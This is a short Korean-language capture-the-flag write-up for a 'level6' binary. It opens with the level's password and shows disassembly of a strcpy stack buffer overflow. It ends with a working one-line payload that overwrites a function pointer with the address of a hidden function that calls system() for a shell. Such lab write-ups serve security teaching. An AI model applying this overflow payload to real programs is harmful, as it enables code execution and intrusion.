> Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

strcpy의 buffer overflow를 이용해서 잘못된 함수 포인터를 넣을 수 있다.

어셈블리 코드를 확인하면 argv[1]을 strcpy를 사용해서 스택에 있는 지역 변수에 복사하는 것을 볼 수 있다.

```
 80484b0:	8b 45 0c             	mov    0xc(%ebp),%eax
 80484b3:	83 c0 04             	add    $0x4,%eax
 80484b6:	8b 00                	mov    (%eax),%eax
 80484b8:	89 c2                	mov    %eax,%edx
 80484ba:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80484be:	89 54 24 04          	mov    %edx,0x4(%esp)
 80484c2:	89 04 24             	mov    %eax,(%esp)
 80484c5:	e8 76 fe ff ff       	call   8048340 <strcpy@plt>
```

strcpy도 gets와 마찬가지로 버퍼의 크기를 확인하지 않는다는 점을 이용해서, ebp + 4 위치를 원하는 위치로 덮어쓸 수 있다.

프로그램에 쓰지 않는 shell을 얻을 수 있는 함수가 있는데, 이 함수의 주소를 strcpy로 덮어씌우면 된다.

08048454 <n>:
 8048454:	55                   	push   %ebp
 8048455:	89 e5                	mov    %esp,%ebp
 8048457:	83 ec 18             	sub    $0x18,%esp
 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave  
 8048467:	c3                   	ret 


```bash
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08",')
```